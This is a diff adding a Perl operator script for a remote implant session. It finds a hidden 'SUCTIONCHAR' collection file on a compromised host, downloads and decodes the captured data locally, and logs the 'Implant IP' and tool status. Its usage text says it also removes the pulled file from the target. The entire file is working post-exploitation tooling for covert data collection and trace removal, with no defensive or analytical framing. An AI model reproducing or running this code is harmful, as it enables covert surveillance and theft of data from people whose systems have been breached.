@@ -1,0 +1,298 @@
+#!/usr/bin/env perl
+## NOPEN autoport script to get/remove/Decode the hidden suctionchar file
+$VER="1.2.0.6" ;
+use File::Basename ;
+myinit();
+my $skiprest=0;
+my $size = 0;
+my $gotversion3 = 0;
+my $gotversion32 = 0;
+my $metafile = "$opsniff/suctionchar.metadata.txt";
+my $sucoutfile = "$opsniff/suctionchar.output.txt";
+#############################
+# Find the file
+#############################
+
+dofindsuc();
+
+dogetsuc() unless $skiprest;
+# End with true value as we require this script elsewhere.
+1;
+
+sub gotversion3plus {
+  return 1 if ($gotversion3 or $gotversion32);
+  return 0;
+}
+
+sub dofindsuc {
+  my @hiddendirs = ();
+  my ($hiddendir,$safehiddendir) = gethiddendir(1,0,\@hiddendirs);
+  if (!$sucfile and !$hiddendir) {
+    progprint("${COLOR_FAILURE}Could not find hidden dir...are you elevated?${COLOR_NORMAL}");
+    $skiprest=1;
+    return 0;
+  }
+  #0db63698b49411aa5234dd83d035239c is the PID file for v. 3.2.x.x and better.
+  my ($version32,$nopengot32,@version32) = doit("-ls $safehiddendir*/a0b973925e397d9acd80e85e2eaa6e60/0db63698b49411aa5234dd83d035239c");
+  $gotversion32++ if ($version32 =~ /0db63698b49411aa5234dd83d035239c/);
+
+  unless ($sucfile) {
+    foreach $thishiddendir (@hiddendirs,".") {
+      my $safehiddendir = $thishiddendir;
+      if ($thishiddendir =~ m,/([^/][^/][^/]+),) {
+	chop($safehiddendir);
+	chop($safehiddendir);
+	$safehiddendir .= "*";
+      }
+      ($output,$nopenlines,@output) = doit("-ls $safehiddendir/a0b973925e397d9acd80e85e2eaa6e60/d5373a14*");
+      ($size,$mon,$sucfile) = $output =~ m,-.*(\d+)\s+(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec).* (\S*/d53\S*),;
+      last if $sucfile;
+    }
+  } else {
+    ($output,$nopenlines,@output) = doit("-ls $sucfile");
+    ($size,$mon,$sucfile) = $output =~ m,-.*(\d+)\s+(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec).* (\S*/d53\S*),;
+  #-rw-------    1 root     root         1201 Apr  2 21:31 2008 /var/tmp/.42d0a64ce836d9db/d5373a146ff9f200a2376054dde25676
+  }
+  unless ($sucfile) {
+    # So there's no sign of a version 3 collection file; try looking for version 2
+    foreach my $thishiddendir (@hiddendirs,".") {
+      my $safehiddendir = $thishiddendir;
+      if ($thishiddendir =~ m,/([^/][^/][^/]+),) {
+	chop($safehiddendir);
+	chop($safehiddendir);
+	$safehiddendir .= "*";
+      }
+      ($output,$nopenlines,@output) = doit("-ls $safehiddendir/d5373a14*");
+      ($size,$mon,$sucfile) = $output =~ m,-.*(\d+)\s+(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec).* (\S*/d53\S*),;      last if $sucfile;
+    }
+  }
+
+  unless ($gotversion32) {
+    $gotversion3++ if ($sucfile =~ /77$/ or
+		       $sucfile =~ /77.\d\d\d\d-\d\d-\d\d/ or
+		       $sucfile =~ /77.\d\d\d\d\d\d\d\d/);
+  }
+  $hiddendir = " in:\n   ".
+    join("\n   ",@hiddendirs)."\n   ".
+    join("/a0b973925e397d9acd80e85e2eaa6e60\n   ",@hiddendirs).
+      "/a0b973925e397d9acd80e85e2eaa6e60";
+  $hiddendir = " $opt_f" if $opt_f;
+  if (!($sucfile)) {
+    progprint("${COLOR_FAILURE}Cannot find SUC file $sucfile$hiddendir${COLOR_NORMAL}");
+    $skiprest=1;
+    return 0;
+  }
+  return $size;
+}
+
+#############################
+# -get the file
+#############################
+sub dogetsuc {
+  my $dotfile = dotdotpathforfile($sucfile);
+  $dotfile = $sucfile unless ($sucfile =~ m,^/,);
+  my $localfile = "$opdown/NOSEND/$nopen_rhostname$sucfile";
+  my $remotedir = dirname($sucfile);
+  nopenlss("-GrUNDYLNOSEND$remotedir",$sucfile);
+
+  my $size = -s $localfile;
+  $localfile =~ s,/([^/]*)/../([^/]*),/\2,g;
+  $localfile =~ s,/+,/,g;
+  unless ($localfile and $size > 0) {
+    mywarn("-get seemed to fail, no local file $localfile");
+    return 0;
+  }
+  #dbg("$output\nlocalfile=$localfile");
+
+#############################
+# Decode the file locally
+#############################
+  mkdir($opsniff) unless (-d $opsniff);
+  my $localdir = dirname $localfile;
+  my $shortname = basename $localfile;
+  # If we got a version 3 collection file, use that tool instead.
+  my $decodetool = "Decode";
+  $decodetool = "Decode33" if (gotversion3plus());
+   ($output,$nopenlines,@output) = doit("-lsh [ -f /current/tmp/$nopen_mypid.namefix ] && source /current/tmp/$nopen_mypid.namefix ; cd \"$localdir\" ; $decodetool $shortname 2>&1 | tee -a $sucoutfile 2>&1");
+  my $checkstring = "found header for";
+  $checkstring = "^Creating file" if (gotversion3plus());
+  my (@results) = grep /$checkstring/ , @output;
+  unless (@results or
+	  ($gotversion3 and $size == 154) or
+	  ($gotversion32 and $size > 0)
+	 ) {
+    my ($emptymore,$mayhave) = ();
+    unless (@results) {
+      $emptymore = "\n\nThis may not be a failure, however.\n\n".
+	"But no output usually comes with size 154, this was size $size.";
+      $mayhave = "may have";
+    }
+    $nostdout++;
+    mymywarn("SUCTIONCHAR Decode failed:\n".$COLOR_FAILURE.
+	     "===\nsize=$size=\n".
+	     "$output\n".
+	     "===\n".
+	     "SUCTIONCHAR Decode$mayhave failed".$COLOR_NORMAL.
+	     $emptymore
+	    );
+    $nostdout--;
+  } else {
+    my $more = "";
+    $more = "${COLOR_FAILURE}EMPTY SUCv3 file (154 bytes). No data.\n\n"
+      if ($size == 154);
+    progprint(".\n\n$more\n${COLOR_SUCCESS}Good!$COLOR_NORMAL Output looks ok.");
+    sleep 3 unless $more;
+  }
+
+  # We crush any old copy, no need to log more than once.
+  open(OUT2,"> $opdown/gotsuc.$nopen_rhostname");
+  open(OUT3,"> $optooldir/suctionchar.txt");
+  my $version = "2.0";
+  $version = "3.0" if $gotversion3;
+  $version = "3.2" if $gotversion32;
+  print OUT2 my $content = "
+--
+Tool: SUCTIONCHAR
+Version: $version
+Usage: EXERCISED
+Tool Status: SUCCESS
+Implant IP: $nopen_myip
+
+";
+  close(OUT2);
+  print OUT3 $content;
+  close(OUT3);
+
+#############################
+# Clean up local filenames
+#############################
+  unless (opendir(DIR,$localdir)) {
+    mywarn("Could not opendir $localdir");
+    return 0;
+  }
+  my $pattern = "/^\[/";
+  $pattern = "/^\d{14}_(.*)$/" if (gotversion3plus());
+  # Open the metadata.txt file.
+  unless(open(METAOUT,"> $metafile")) {
+    mywarn("Could not open metadata file $metafile");
+    return 0;
+  }
+  foreach my $capfile (grep $pattern , readdir DIR) {
+#   dbg("in autogetnewsuc, capfile = =$capfile=");
+    my ($cmd,$day,$daystr,$monstr,$mday,$h,$m,$s,$year,$month) = ();
+    ($cmd,$daystr,$monstr,$mday,$h,$m,$s,$year) = $capfile =~
+      m,\[(.*)\]_\[(Mon|Tue|Wed|Thu|Fri|Sat|Sun)\s+(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+(\d+)\s+(\d+):(\d+):(\d+)\s+(\d{4})\], unless (gotversion3plus());
+    ($year,$month,$mday,$h,$m,$s,$cmd) = $capfile =~
+      m,^(\d{4})(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})_(\S*)$, if (gotversion3plus());
+    $month = $nummon{$monstr}+1 unless (gotversion3plus());
+    my $newname = sprintf("%04d_%02d_%02d_%02d%02d%02d___$cmd.txt",
+			  $year,$month,$mday,$h,$m,$s) if $cmd;
+    print METAOUT "$newname\n" if $cmd;
+    $newname =~ s/[[:punct:]]/_/g;
+    $newname =~ s,[ \[\]],_,g;
+    $newname =~ s/_txt$/.txt/g;
+    rename("$localdir/$capfile","$opsniff/$newname");
+  }
+  closedir(DIR);
+  close(METAOUT);
+  my $message = ".\n           Done.$COLOR_NORMAL\n\n$COLOR_NOTE\n".
+                "Decoded files renamed and moved to $opsniff:$COLOR_NORMAL\n".
+                "ls -Al $opsniff\n".
+                `ls -Al $opsniff`."\n$COLOR_NOTE\n";
+  my $extra = "Original pulled file still here:$COLOR_NORMAL\n".
+              "ls -Al \"$localdir\"\n".
+              `ls -Al "$localdir"`.
+	      "\n";
+	      
+  progprint("$message$extra");
+  if ($printlater) {
+    progprint($printlater,$COLOR_FAILURE);
+  }
+  return 1;
+}
+
+sub mymywarn {
+  local ($what,$color,$color2,$what2) = (@_) ;
+  $color = $COLOR_FAILURE unless $color ;
+  $color2 = $COLOR_FAILURE unless $color2 ;
+
+  progprint($what,$color,$color2,$what2);
+  sleep 5;
+  $printlater .= $what;
+  $badcontent++ unless $what =~ /unable to sort by /i ;
+  if ($autodone) {
+    open(MYOUT,">> $opdir/latewarnings.$nopen_rhostname") || return ;
+    print MYOUT "$what\n" ;
+    close MYOUT;
+  } else {
+    dbg("NOT Logging to latewarnings in mymywarn(@_)");
+  }
+}
+
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0;
+  $skiprest = 0;
+  if ($willautoport and $socket) {
+    progprint("$prog called -gs getnewsuc @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }
+    require $autoutils;
+    $prog = "-gs getnewsuc";
+    $vertext = "$prog version $VER\n" ;
+    mydie("No user servicable parts inside.\n".
+	  "(I.e., noclient calls $prog, not you.)\n".
+	  "$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			      -e $nopen_mylog);
+  }
+  mydie("bad option(s)") if (! Getopts( "hvf:" ) ) ;
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session via when \"$prog\" is used.
+
+";
+  $gsusagetext="Usage: $prog
+
+$prog uses -ls to find the hidden directory, and looks both there and
+in ./ for the SUC data file. If it finds it, $prog downloads the SUC
+data file if it is there and Decodes it locally. If the Decode is successful,
+it removes the target file just pulled.
+
+The local files end up in $opsniff,
+where they belong.
+
+Note that $prog is used on the newer STOIC based SUC, not the
+older IN one (but work with the new SUC v. 2 AND v. 3).
+
+OPTIONS
+
+  -h / -v       show this usage statement / $prog version
+  -f file       Use this remote file instead of looking for it in the
+                hidden directory
+
+";
+  usage() if ($opt_h or $opt_v);
+  # make sure ARGV is healthy
+  $sucfile = $opt_f;
+  parsestatus() if ($sucfile =~ m,^\./,);
+#  mydie("-f $opt_f option must be a full path to a file")
+#    unless ($sucfile =~ m,^/.+, or !$opt_f);
+  # If $socket is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $socket = pilotstart(quiet) unless $socket;
+  # $printlater is appended to by mymywarn()
+  $printlater = "" ;
+
+}#myinit
+
+
